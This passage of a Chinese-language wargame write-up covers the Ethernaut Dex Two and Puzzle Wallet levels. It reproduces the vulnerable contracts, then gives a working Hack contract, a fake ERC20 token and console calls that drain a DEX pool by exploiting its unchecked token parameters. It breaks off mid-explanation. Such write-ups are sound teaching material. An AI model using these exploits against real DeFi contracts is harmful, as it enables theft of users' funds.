<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token2</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token2</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">add_liquidity</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token_address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">swapAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getSwapAmount</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getSwapAmount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="p">((</span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SwappableTokenTwo</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_dex</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_dex</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;InvalidApprover&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p>相比合约 <code>Dex</code>，合约 <code>DexTwo</code> 在进行货币交换时不再检查输入参数 <code>from</code>、<code>to</code>，因此可以借助其它代币来清空 <code>DexTwo</code> 中的 <code>token1</code> 和 <code>token2</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">tokens</span><span class="p">;</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DexTwo</span><span class="w"> </span><span class="nx">dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DexTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">tokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">token1</span><span class="p">());</span>
<span class="w">    </span><span class="nx">tokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">token2</span><span class="p">());</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">SwappableTokenTwo</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;fake&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;F&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="w">      </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">      </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">      </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>声明实现了 ERC20 标准的合约不一定可信，部分合约的<a href="https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca">函数返回值可能缺失</a>，也可能存在恶意行为</p>
</li>
<li>
<p>更简单地，可以部署一个恶意的 ERC20 合约</p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">DexTwoAttackToken</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="s2">&quot;&lt;DexTwoAttackTokenAddress&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">token1</span><span class="p">(),</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="s2">&quot;&lt;DexTwoAttackTokenAddress&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">token2</span><span class="p">(),</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
</code></pre></div>
</li>
</ul>
<h2 id="24-puzzle-wallet">24. Puzzle Wallet<a class="headerlink" href="#24-puzzle-wallet" title="Permanent link">&para;</a></h2>
<p>成为代理合约的管理员</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">experimental</span><span class="w"> </span><span class="nx">ABIEncoderV2</span><span class="p">;</span><span class="w"> </span><span class="c1">// redundant</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleProxy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">admin</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_admin</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="p">(</span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_admin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">admin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Caller is not the admin&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">proposeNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approveNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeTo</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newImplementation</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_upgradeTo</span><span class="p">(</span><span class="nx">_newImplementation</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitelisted</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">init</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Already initialized&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
<span class="w">        </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;Not whitelisted&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setMaxBalance</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Contract balance is not 0&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">addToWhitelist</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not the owner&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Max balance reached&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient balance&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">to</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Execution failed&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">multicall</span><span class="p">(</span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">bool</span><span class="w"> </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">            </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">selector</span><span class="p">;</span>
<span class="w">            </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">selector</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">_data</span><span class="p">,</span><span class="w"> </span><span class="mf">32</span><span class="p">))</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">require</span><span class="p">(</span><span class="o">!</span><span class="nx">depositCalled</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Deposit can only be called once&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="c1">// Protect against reusing msg.value</span>
<span class="w">                </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Error while delegating call&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p>调用逻辑合约 <code>PuzzleWallet</code> 相关函数需要在白名单内且只有 <code>owner</code> 才能添加指定地址到白名单</p>
